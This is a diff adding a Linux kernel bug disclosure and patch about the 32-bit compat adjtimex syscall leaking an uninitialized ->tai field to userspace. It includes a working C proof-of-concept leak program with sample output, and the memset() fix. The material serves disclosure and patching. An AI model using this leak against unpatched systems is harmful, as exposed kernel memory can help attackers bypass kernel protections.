@@ -1,0 +1,76 @@
+/*
+Commit 3a4d44b61625 ("ntp: Move adjtimex related compat syscalls to native
+counterparts") removed the memset() in compat_get_timex(). Since then, the
+compat adjtimex syscall can invoke do_adjtimex() with an uninitialized
+->tai. If do_adjtimex() doesn't write to ->tai (e.g. because the arguments
+are invalid), compat_put_timex() then copies the uninitialized ->tai field
+to userspace.
+
+Demo:
+
+
+$ cat leak_32.c
+*/
+
+#include <sys/timex.h>
+#include <assert.h>
+#include <stdio.h>
+#include <string.h>
+#include <errno.h>
+#include <stdint.h>
+#include <err.h>
+
+/* from include/linux/timex.h */
+#define ADJ_ADJTIME 0x8000
+
+int main(void) {
+  struct timex tx;
+  memset(&tx, 0, sizeof(tx));
+  tx.modes = ADJ_ADJTIME; /* invalid, causes early bailout */
+  int res = adjtimex(&tx);
+  assert(res == -1 && errno == EINVAL);
+  printf("0x%08x\n", (unsigned int)tx.tai);
+  return 0;
+}
+
+/*
+$ gcc -o leak_32 leak_32.c -Wall -m32
+$ for i in {0..10}; do sleep 1; ./leak_32; done
+0x01a300b0
+0x0be8f6f0
+0x0610d5f0
+0x01fa0170
+0x0bf05670
+0x0bf05670
+0x0610d5f0
+0x0610cd70
+0x0610d5f0
+0x0610d5f0
+
+
+Fixed in master: https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=0a0b98734479aa5b3c671d5190e86273372cab95
+
+
+Fix it by adding the memset() back.
+
+Fixes: 3a4d44b61625 ("ntp: Move adjtimex related compat syscalls to native counterparts")
+Signed-off-by: Jann Horn <jannh@google.com>
+---
+ kernel/compat.c | 1 +
+ 1 file changed, 1 insertion(+)
+
+diff --git a/kernel/compat.c b/kernel/compat.c
+index 6d21894806b4..92d8c98c0f57 100644
+--- a/kernel/compat.c
++++ b/kernel/compat.c
+@@ -34,6 +34,7 @@ int compat_get_timex(struct timex *txc, const struct compat_timex __user *utp)
+ {
+ 	struct compat_timex tx32;
+ 
++	memset(txc, 0, sizeof(struct timex));
+ 	if (copy_from_user(&tx32, utp, sizeof(struct compat_timex)))
+ 		return -EFAULT;
+ 
+-- 
+2.17.0.441.gb46fe60e1d-goog
+*/
